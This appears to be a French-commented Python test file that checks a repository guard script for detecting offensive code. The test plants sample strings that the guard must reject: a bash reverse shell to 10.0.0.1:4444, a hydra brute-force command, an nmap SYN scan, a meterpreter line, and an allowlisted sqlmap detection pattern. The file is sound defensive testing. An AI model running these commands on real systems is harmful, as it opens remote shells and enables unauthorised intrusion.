"""Invariant du projet : **aucune capacité offensive**.

Ce test verrouille l'engagement central de Thot Secure. Il exécute le garde-fou
``scripts/check-no-offensive-capability.py`` sur le dépôt réel (il doit ne rien trouver), puis
vérifie que ce garde-fou **détecte réellement** une capacité offensive injectée dans une copie
temporaire.

Tester le test est indispensable ici : un contrôle qui ne détecte rien passerait pour une
garantie alors qu'il ne serait qu'un décor.
"""

from __future__ import annotations

import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
GUARD = REPO_ROOT / "scripts" / "check-no-offensive-capability.py"

#: Exemples de code qui DOIVENT être refusés (veritable échantillon minimal, aucun code
#: fonctionnel : ce sont des chaînes inoffensives placées dans un fichier de test temporaire).
OFFENSIVE_SAMPLES: tuple[tuple[str, str], ...] = (
    ("reverse_shell.py", 'payload = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"\n'),
    ("brute_force.py", 'subprocess.run(["hydra", "-l", "admin", "-P", "words.txt", "cible"])\n'),
    ("scanner.py", 'subprocess.run(["nmap", "-sS", "192.0.2.0/24"])\n'),
    ("exploit.py", 'meterpreter_session = connect(target)\n'),
)


class NoOffensiveCapabilityTest(unittest.TestCase):
    def test_guard_exists(self) -> None:
        self.assertTrue(GUARD.is_file(), "le garde-fou doit être présent dans scripts/")

    def test_repository_contains_no_offensive_capability(self) -> None:
        """Le dépôt livré ne doit contenir aucune construction offensive."""
        completed = subprocess.run(  # noqa: S603 - script local, arguments fixes
            [sys.executable, str(GUARD), str(REPO_ROOT)],
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
            timeout=120,
            check=False,
        )
        self.assertEqual(
            0,
            completed.returncode,
            f"le garde-fou a détecté une capacité offensive :\n{completed.stdout}\n{completed.stderr}",
        )
        self.assertIn("aucune capacité offensive", completed.stdout)

    def test_guard_detects_offensive_code(self) -> None:
        """Le garde-fou doit échouer (code 3) sur du code offensif — sinon il ne sert à rien."""
        with tempfile.TemporaryDirectory(prefix="thotsecure-guard-") as temporary:
            sandbox = Path(temporary)
            # On ne copie que les répertoires analysés : le contrôle doit rester rapide.
            for directory in ("src", "scripts"):
                source = REPO_ROOT / directory
                if source.is_dir():
                    shutil.copytree(source, sandbox / directory)
            shutil.copy2(GUARD, sandbox / "scripts" / GUARD.name)

            for filename, content in OFFENSIVE_SAMPLES:
                target = sandbox / "src" / filename
                target.write_text(content, encoding="utf-8")
                completed = subprocess.run(  # noqa: S603
                    [sys.executable, str(sandbox / "scripts" / GUARD.name), str(sandbox)],
                    capture_output=True,
                    text=True,
                    encoding="utf-8",
                    errors="replace",
                    timeout=120,
                    check=False,
                )
                self.assertEqual(
                    3,
                    completed.returncode,
                    f"{filename} aurait dû être refusé (code 3), sortie :\n{completed.stdout}",
                )
                self.assertIn("refusée", completed.stdout)
                target.unlink()

    def test_allowlist_marker_is_respected(self) -> None:
        """Un fichier qui déclare explicitement un motif de détection ne doit pas être bloqué."""
        with tempfile.TemporaryDirectory(prefix="thotsecure-guard-ok-") as temporary:
            sandbox = Path(temporary)
            shutil.copytree(REPO_ROOT / "scripts", sandbox / "scripts")
            (sandbox / "src").mkdir(parents=True, exist_ok=True)
            (sandbox / "src" / "detection_motif.py").write_text(
                "# thotsecure: defensive-detection-pattern — motif de détection, pas une capacité\n"
                'PATTERN = r"sqlmap -u"\n',
                encoding="utf-8",
            )
            completed = subprocess.run(  # noqa: S603
                [sys.executable, str(sandbox / "scripts" / GUARD.name), str(sandbox)],
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="replace",
                timeout=120,
                check=False,
            )
            self.assertEqual(0, completed.returncode, completed.stdout)


if __name__ == "__main__":  # pragma: no cover
    unittest.main()
